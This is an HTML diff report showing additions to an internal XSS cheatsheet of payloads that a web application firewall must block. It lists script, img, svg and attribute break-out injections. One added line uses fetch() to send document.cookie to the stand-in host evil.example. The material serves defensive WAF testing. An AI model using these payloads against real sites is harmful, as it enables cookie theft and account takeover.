@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'">
+<title>Diff — xss-cheatsheet-before.md → xss-cheatsheet-after.md</title>
+<style>
+:root{color-scheme:light;
+--canvas:#f7f7f4;--surface:#f2f1ed;--surface-raised:#f7f7f4;
+--text:#26251e;--text-muted:#6d6c63;--border:#cdcdc9;--border-strong:#a1a19f;
+--gutter-bg:#f2f1ed;--gutter-text:#6b6960;--empty-bg:#f2f1ed;
+--hunk-bg:#e6e5e0;--hunk-text:#5e5d55;--hunk-border:#cdcdc9;
+--add-bg:#e4efe7;--add-inline:#bfe0cb;--add-marker:#2f6d4f;
+--del-bg:#f7e6e3;--del-inline:#f3c9cd;--del-marker:#b02a48;
+--warn-bg:#f6ecd4;--warn-border:#c08532;--warn-text:#574011;--focus:#f54e00;
+--sp-1:4px;--sp-2:8px;--sp-3:12px;--sp-4:16px;--sp-6:24px;--sp-8:32px;
+--fs-0:1rem;
+--fs-h1:calc(var(--fs-0) * 1.5);
+--fs-h2:calc(var(--fs-0) * 1.0625);
+--fs-sm:calc(var(--fs-0) * .875);
+--fs-code:13px;
+--rhythm:24px;
+--measure:min(72rem, 84ch);
+--text-caption:13px;
+--font-ui:"CursorGothic",Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+--font-code:"berkeleyMono",ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
+@supports (font-size:1cqi){:root{
+--fs-0:clamp(.875rem,calc(.766rem + .3125cqi),1rem);
+--fs-code:clamp(12px,calc(.6625rem + .2cqi),13px);
+--rhythm:clamp(16px,calc(8px + 2cqi),24px);
+--text-caption:clamp(12px,calc(.6625rem + .2cqi),13px)}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--canvas);color:var(--text);font:1rem/1.5 var(--font-ui)}
+main{container-type:inline-size;container-name:report;
+max-width:100rem;margin:0 auto;padding:2rem}
+main>*{font-size:var(--fs-0)}
+.report-header,.warn,footer{max-width:var(--measure)}
+.summary-sec{max-width:72rem}
+h1{font-size:var(--fs-h1);line-height:1.25;font-weight:400;letter-spacing:-.005em;margin:0 0 var(--sp-1)}
+h2{font-size:var(--fs-h2);line-height:1.3;font-weight:500;margin:var(--rhythm) 0 var(--sp-3)}
+.skip{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;
+clip:rect(0 0 0 0);white-space:nowrap;border:0}
+a.skip:focus{position:static;width:auto;height:auto;margin:0;clip:auto;
+display:inline-block;background:var(--surface);padding:var(--sp-2);
+border:2px solid var(--focus);border-radius:4px}
+.meta{color:var(--text-muted);font-size:var(--text-caption);margin:0}
+.warn{border:1px solid var(--warn-border);background:var(--warn-bg);color:var(--warn-text);
+padding:var(--sp-3) var(--sp-4);border-radius:4px;margin:var(--sp-4) 0}
+.warn h2{margin:0 0 var(--sp-1);font-size:var(--fs-0);color:var(--warn-text)}
+.warn ul{margin:0;padding-left:1.2rem}
+.stat-strip{display:flex;flex-wrap:wrap;gap:var(--sp-2);margin:var(--sp-3) 0;padding:0}
+.stat{font:600 var(--text-caption)/1.4 var(--font-code);font-variant-numeric:tabular-nums;
+padding:var(--sp-1) var(--sp-2);border-radius:4px;border:1px solid var(--border)}
+.stat-add{color:var(--add-marker);background:var(--add-bg);border-color:var(--add-inline)}
+.stat-del{color:var(--del-marker);background:var(--del-bg);border-color:var(--del-inline)}
+.stat-chg,.stat-move,.stat-eq{color:var(--text-muted);background:var(--surface)}
+.summary{border-collapse:separate;border-spacing:0;border:1px solid var(--border);
+border-radius:4px;overflow:hidden;font-size:var(--fs-sm);margin:var(--sp-3) 0}
+.summary th,.summary td{padding:var(--sp-2) var(--sp-3);text-align:left;
+border-bottom:1px solid var(--border)}
+.summary tr:last-child th,.summary tr:last-child td{border-bottom:0}
+.summary th{background:var(--surface);color:var(--text-muted);font-weight:500;width:9rem}
+.legend{display:flex;flex-wrap:wrap;gap:var(--sp-2) var(--sp-4);list-style:none;padding:0;
+margin:var(--sp-3) 0;font-size:var(--text-caption);color:var(--text-muted)}
+.legend li{display:flex;align-items:center;gap:var(--sp-2)}
+.key{font:700 var(--text-caption)/1.4 var(--font-code);min-width:1.4rem;text-align:center;border-radius:4px}
+.key-add{color:var(--add-marker);background:var(--add-bg)}
+.key-del{color:var(--del-marker);background:var(--del-bg)}
+.diff-frame{border:1px solid var(--border);border-radius:4px;background:var(--surface-raised)}
+.diff-scroll{overflow-x:auto}
+.diff-scroll:focus-visible{outline:2px solid var(--focus);outline-offset:-2px}
+table.diff{border-collapse:collapse;width:100%;
+font-family:var(--font-code);font-size:var(--fs-code);line-height:1.5;
+table-layout:fixed;font-variant-ligatures:none;tab-size:4}
+.diff .col-no{width:calc(5ch + 1rem)}.diff .col-mark{width:1.6rem}
+.diff thead th{background:var(--surface);color:var(--text-muted);text-align:left;
+padding:var(--sp-2);border-bottom:1px solid var(--border-strong);
+font-family:var(--font-ui);font-size:var(--text-caption);font-weight:600}
+.diff td,.diff th{vertical-align:top}
+td.no{text-align:right;color:var(--gutter-text);background:var(--gutter-bg);user-select:none;
+padding:1px var(--sp-2);white-space:nowrap;font-variant-numeric:tabular-nums;
+border-right:1px solid var(--border)}
+td.mark{text-align:center;user-select:none;font-weight:700;padding:1px 0}
+td.txt{padding:1px var(--sp-2);white-space:pre-wrap;overflow-wrap:anywhere}
+td.is-add{background:var(--add-bg)}td.mark.is-add{color:var(--add-marker)}
+td.no.is-add{background:var(--add-bg);color:var(--add-marker)}
+td.is-remove{background:var(--del-bg)}td.mark.is-remove{color:var(--del-marker)}
+td.no.is-remove{background:var(--del-bg);color:var(--del-marker)}
+td.is-empty{background:var(--empty-bg)}
+.sxs{min-width:60rem}
+.sxs td:nth-child(4),.sxs th:nth-child(4){border-left:2px solid var(--border-strong)}
+tr.hunk-head th{background:var(--hunk-bg);color:var(--hunk-text);text-align:left;
+font-family:var(--font-code);font-weight:600;padding:var(--sp-1) var(--sp-2);
+border-block:1px solid var(--hunk-border)}
+tr.collapse td{text-align:center;color:var(--text-muted);background:var(--surface);
+padding:var(--sp-1) var(--sp-2);border-block:1px solid var(--border)}
+tr.sec td{padding-block:4px}
+tr.sec td.txt{font-family:var(--font-ui);font-weight:600;font-size:calc(var(--fs-code) * 1.15)}
+tr.context.sec td{background:var(--surface);border-block:1px solid var(--border)}
+tr.context.sec td.no{background:var(--surface)}
+mark.wd{padding:0 1px;border-radius:2px;color:inherit}
+mark.wd.add{background:var(--add-inline);text-decoration:underline}
+mark.wd.del{background:var(--del-inline);text-decoration:line-through}
+.legend mark.wd{color:var(--text)}
+footer{display:flex;flex-wrap:wrap;gap:var(--sp-2) var(--sp-4);justify-content:space-between;
+margin-top:var(--sp-8);color:var(--text-muted);font-size:var(--text-caption);
+border-top:1px solid var(--border);padding-top:var(--sp-4)}
+footer p{margin:0}
+@container report (max-width:34rem){
+.summary th{width:auto}
+td.no{padding-inline:var(--sp-1)}}
+@container report (min-width:80rem){
+td.txt{padding-block:2px}}
+@media(forced-colors:active){mark.wd{outline:1px solid CanvasText}
+td.mark{color:CanvasText}}
+</style>
+</head>
+<body>
+<a class="skip" href="#diff">Skip to differences</a>
+<main>
+<header class="report-header">
+<h1>Diff — xss-cheatsheet-before.md → xss-cheatsheet-after.md</h1>
+<p class="meta">Generated 2026-07-16T14:22:50+00:00 by sk-doc create-diff · markdown · local only, no network.</p>
+</header>
+
+<section class="summary-sec" aria-labelledby="stitle">
+<h2 id="stitle">Summary</h2>
+<p class="stat-strip"><span class="stat stat-add">+5 added</span><span class="stat stat-del">−0 removed</span><span class="stat stat-chg">±0 changed</span><span class="stat stat-move">↔0 moved</span><span class="stat stat-eq">=10 unchanged</span></p>
+<table class="summary"><caption class="skip">Change summary</caption><tbody><tr><th scope="row">Before</th><td>xss-cheatsheet-before.md (10 lines)</td></tr><tr><th scope="row">After</th><td>xss-cheatsheet-after.md (15 lines)</td></tr><tr><th scope="row">Format</th><td>markdown — Full fidelity — text compared after Unicode and whitespace normalization.</td></tr></tbody></table>
+<ul class="legend" aria-label="Diff legend">
+<li><span class="key key-add" aria-hidden="true">+</span> Added line</li>
+<li><span class="key key-del" aria-hidden="true">−</span> Removed line</li>
+<li><mark class="wd add">text</mark> Inline addition</li>
+<li><mark class="wd del">text</mark> Inline removal</li>
+</ul>
+</section>
+<section aria-labelledby="dtitle" id="diff">
+<h2 id="dtitle">Differences (unified view)</h2>
+<div class="diff-frame"><table class="diff"><colgroup><col class="col-no"><col class="col-no"><col class="col-mark"><col></colgroup><caption class="skip">Unified differences</caption><thead><tr><th scope="col" class="no">Old</th><th scope="col" class="no">New</th><th scope="col" class="mark"><span class="skip">Change</span></th><th scope="col">Content</th></tr></thead><tbody class="hunk"><tr class="hunk-head"><th scope="rowgroup" colspan="4">@@ -1,10 +1,15 @@ · § XSS Cheatsheet (internal)</th></tr><tr class="context sec"><td class="no">1</td><td class="no">1</td><td class="mark"></td><td class="txt"># XSS Cheatsheet (internal)</td></tr><tr class="context"><td class="no">2</td><td class="no">2</td><td class="mark"></td><td class="txt"></td></tr><tr class="context"><td class="no">3</td><td class="no">3</td><td class="mark"></td><td class="txt">Payloads our WAF must block. These are documented as text, never executed.</td></tr><tr class="context"><td class="no">4</td><td class="no">4</td><td class="mark"></td><td class="txt"></td></tr><tr class="context sec"><td class="no">5</td><td class="no">5</td><td class="mark"></td><td class="txt">## Classic</td></tr><tr class="context"><td class="no">6</td><td class="no">6</td><td class="mark"></td><td class="txt">- `&lt;script&gt;alert(1)&lt;/script&gt;`</td></tr><tr class="context"><td class="no">7</td><td class="no">7</td><td class="mark"></td><td class="txt">- `&lt;img src=x onerror=alert(document.cookie)&gt;`</td></tr><tr class="add"><td class="no is-add"></td><td class="no is-add">8</td><td class="mark is-add" aria-label="added">+</td><td class="txt is-add">- `&lt;svg onload=alert(1)&gt;`</td></tr><tr class="context"><td class="no">8</td><td class="no">9</td><td class="mark"></td><td class="txt"></td></tr><tr class="context sec"><td class="no">9</td><td class="no">10</td><td class="mark"></td><td class="txt">## Attribute break-out</td></tr><tr class="context"><td class="no">10</td><td class="no">11</td><td class="mark"></td><td class="txt">- `&quot; onmouseover=&quot;alert(1)`</td></tr><tr class="add"><td class="no is-add"></td><td class="no is-add">12</td><td class="mark is-add" aria-label="added">+</td><td class="txt is-add">- `&#x27;&gt;&lt;script&gt;fetch(&#x27;//evil.example/&#x27;+document.cookie)&lt;/script&gt;`</td></tr><tr class="add"><td class="no is-add"></td><td class="no is-add">13</td><td class="mark is-add" aria-label="added">+</td><td class="txt is-add"></td></tr><tr class="add sec"><td class="no is-add"></td><td class="no is-add">14</td><td class="mark is-add" aria-label="added">+</td><td class="txt is-add">## SVG</td></tr><tr class="add"><td class="no is-add"></td><td class="no is-add">15</td><td class="mark is-add" aria-label="added">+</td><td class="txt is-add">- `&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;`</td></tr></tbody></table></div>
+</section>
+<footer>
+<p>All processing happened on this machine.</p>
+<p>Self-contained HTML · zero JavaScript · no external requests.</p>
+</footer>
+</main>
+</body>
+</html>
